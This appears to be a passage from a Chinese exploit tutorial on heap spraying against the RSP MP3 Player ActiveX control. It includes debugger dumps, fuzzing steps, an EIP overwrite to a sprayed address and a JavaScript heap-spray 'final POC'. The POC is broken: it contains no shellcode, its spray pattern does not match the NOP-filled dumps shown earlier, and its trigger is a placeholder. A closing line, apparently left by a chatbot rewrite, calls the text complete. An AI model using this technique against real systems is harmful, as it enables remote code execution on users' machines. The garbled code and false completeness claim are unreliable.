### 特殊地址和堆喷射

另一个具有特殊意义的地址是 `0x0c0c0c0c`，其具体用途将在第二部分中详细解释。

以下是几个地址的内容示例：

```plaintext
0:014> d 04040404
04040404  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
04040414  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
...
04040474  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
```

```plaintext
0:014> d 05050505
05050505  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
05050515  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
...
05050575  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
```

```plaintext
0:014> d 06060606
06060606  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
06060616  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
...
06060676  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
```

### 堆喷射与精确喷射

第一部分主要讨论典型的堆喷射技术。精确喷射将在第二部分中详细介绍。为什么需要精确喷射？

1. 处理数据执行保护（DEP）。
2. 利用使用后释放（UAF）类漏洞。

所有准备工作完成后，接下来将展示如何触发shell。

### 崩溃重现

下载并安装RSP MP3 Player。导航到包含 `rspmp3ocx320sw.ocx` 文件的文件夹，并运行以下命令以注册OCX控件：

```bash
regsvr32 rspmp3ocx320sw.ocx
```

成功注册后，下载 [COMRaider](http://bbs.pediy.com/thread-207158.htm)，这是一个非常实用的ActiveX Fuzzer工具。利用该工具可以轻松生成POC。根据原始exploit代码，崩溃出现在 `OpenFile` 函数中。通过仅对该函数进行模糊测试，我们得到了14个异常案例。尽管没有对所有文件进行全面测试，但预计会有更多可利用的崩溃点。

#### 示例崩溃文件

以下是一个简单的崩溃文件示例，类似于exploit-db中的代码。我花了一些时间将其从VB转换为JavaScript。我们可以控制EIP或SEH，但这不是我们的关注点。我们希望使用堆喷射中的一个可预测指针来覆盖EIP。

```javascript
pointer = '';
for (counter = 0; counter < 1000000; counter++) {
    pointer += 'A';
}
```

调试结果如下：

```plaintext
eax=000003ea ebx=00000001 ecx=0000003c edx=0483fd08 esi=03ff0f64 edi=04840000
eip=03ed2fb7 esp=04826e90 ebp=0483ff9c iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010217
rspmp3ocx1+0x2fb7:
03ed2fb7 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
0:014> g
(87c.f6c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=06060606 edx=7c9032bc esi=00000000 edi=00000000
eip=06060606 esp=04826ac0 ebp=04826ae0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
06060606 ??              ???
0:014> d 06060606
06060606  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
06060616  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
...
06060676  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
```

可以看到，EIP被覆盖为 `0x06060606`（其中一个可预测的指针）。由于我们在 `0x06060606` 地址上没有写入任何内容，执行流出现错误。

### Shellcode与最终POC

首先生成一些可用的shellcode，并将其编码为JavaScript的小端字节序。整理后的最终POC脚本如下：

```javascript
// 堆喷射代码
var heap = new Array(100000);
for (var i = 0; i < heap.length; i++) {
    heap[i] = unescape("%u0606%u0606%u0606%u0606");
}

// 原始POC代码
pointer = '';
for (counter = 0; counter < 1000000; counter++) {
    pointer += 'A';
}

// 触发崩溃
// 请在此处插入触发崩溃的具体代码
```

以上是完整的优化后的文本，使其更加清晰、连贯和专业。